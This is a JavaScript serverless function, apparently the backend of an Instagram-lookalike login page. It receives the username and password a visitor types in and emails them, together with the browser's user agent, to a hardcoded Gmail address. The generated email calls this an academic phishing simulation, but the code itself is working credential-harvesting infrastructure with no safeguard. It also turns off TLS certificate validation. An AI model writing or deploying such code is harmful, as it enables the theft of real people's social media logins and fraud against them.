const nodemailer = require('nodemailer');

// Configurar transporter de e-mail
const createTransporter = () => {
    // Usar APENAS variáveis de ambiente
    const emailUser = process.env.EMAIL_USER;
    const emailPass = process.env.EMAIL_PASS;
    
    if (!emailUser || !emailPass) {
        console.error('❌ Variáveis de e-mail não configuradas');
        console.log('EMAIL_USER:', emailUser ? 'Configurado' : 'NÃO CONFIGURADO');
        console.log('EMAIL_PASS:', emailPass ? 'Configurado' : 'NÃO CONFIGURADO');
        return null;
    }
    
    console.log('📧 Configurando e-mail com:', emailUser);
    
    return nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: emailUser,
            pass: emailPass
        },
        // Configurações adicionais importantes
        tls: {
            rejectUnauthorized: false
        }
    });
};

export default async function handler(req, res) {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ 
            success: false, 
            message: 'Método não permitido' 
        });
    }

    try {
        const { username, password, timestamp, userAgent } = req.body;
        
        console.log('📨 Recebendo dados do usuário:', username);
        
        if (!username) {
            return res.status(400).json({
                success: false,
                message: 'Nome de usuário é obrigatório'
            });
        }

        // Criar transporter
        const transporter = createTransporter();
        
        if (!transporter) {
            throw new Error('Transporter de e-mail não configurado');
        }
        
        // Configurar e-mail
        const mailOptions = {
            from: `"Instagram Simulator" <${process.env.EMAIL_USER}>`,
            to: process.env.ADMIN_EMAIL || 'zenosama892@gmail.com',
            subject: `🚨 Tentativa de Acesso - ${username}`,
            html: `
                <!DOCTYPE html>
                <html>
                <head>
                    <style>
                        body { font-family: Arial, sans-serif; line-height: 1.6; }
                        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
                        .header { background: #f8f9fa; padding: 20px; text-align: center; border-radius: 5px; }
                        .alert { color: #856404; background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0; }
                        .info { background: #e9ecef; padding: 15px; border-radius: 5px; }
                        .footer { margin-top: 30px; font-size: 12px; color: #6c757d; text-align: center; }
                        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
                        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
                        th { background: #f2f2f2; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="header">
                            <h2>⚠️ Alerta de Segurança - Simulação Acadêmica</h2>
                            <p>Sistema de Monitoramento de Login</p>
                        </div>
                        
                        <div class="alert">
                            <strong>ATENÇÃO:</strong> Esta é uma simulação para fins educacionais.
                        </div>
                        
                        <h3>📋 Detalhes da Tentativa de Acesso</h3>
                        <table>
                            <tr>
                                <th>Campo</th>
                                <th>Valor</th>
                            </tr>
                            <tr>
                                <td><strong>Usuário</strong></td>
                                <td>${username}</td>
                            </tr>
                            <tr>
                                <td><strong>Senha</strong></td>
                                <td>${password ? password : 'Não informada'}</td>
                            </tr>
                            <tr>
                                <td><strong>Status</strong></td>
                                <td><span style="color: red;">❌ ACESSO NEGADO</span></td>
                            </tr>
                            <tr>
                                <td><strong>Data/Hora</strong></td>
                                <td>${new Date(timestamp).toLocaleString('pt-BR')}</td>
                            </tr>
                        </table>
                        
                        <h3>🌐 Informações Técnicas</h3>
                        <div class="info">
                            <table>
                                <tr>
                                    <td><strong>User Agent</strong></td>
                                    <td>${userAgent}</td>
                                </tr>
                                <tr>
                                    <td><strong>Sistema</strong></td>
                                    <td>Instagram Login Simulator</td>
                                </tr>
                                <tr>
                                    <td><strong>Projeto</strong></td>
                                    <td>Acadêmico - Simulação de Phishing Ético</td>
                                </tr>
                            </table>
                        </div>
                        
                        <div class="footer">
                            <p>⚠️ Este e-mail é gerado automaticamente. Não responda.</p>
                            <p>Projeto desenvolvido para fins educacionais.</p>
                        </div>
                    </div>
                </body>
                </html>
            `,
            text: `Tentativa de Acesso\n\nUsuário: ${username}\nSenha: ${password || 'Não informada'}\nData: ${new Date(timestamp).toLocaleString('pt-BR')}\nStatus: ACESSO NEGADO\n\nEsta é uma simulação acadêmica.`
        };

        console.log('📤 Enviando e-mail para:', process.env.ADMIN_EMAIL || 'zenosama892@gmail.com');
        
        // Enviar e-mail
        const info = await transporter.sendMail(mailOptions);
        
        console.log('✅ E-mail enviado com sucesso!', info.messageId);
        
        res.status(200).json({
            success: true,
            message: 'E-mail enviado com sucesso!',
            messageId: info.messageId,
            username: username,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ Erro ao enviar e-mail:', error);
        console.error('Código do erro:', error.code);
        console.error('Comando do erro:', error.command);
        
        // Retornar erro detalhado
        res.status(500).json({
            success: false,
            message: 'Erro ao enviar e-mail',
            error: error.message,
            details: 'Verifique as variáveis de ambiente no Vercel',
            code: error.code
        });
    }
}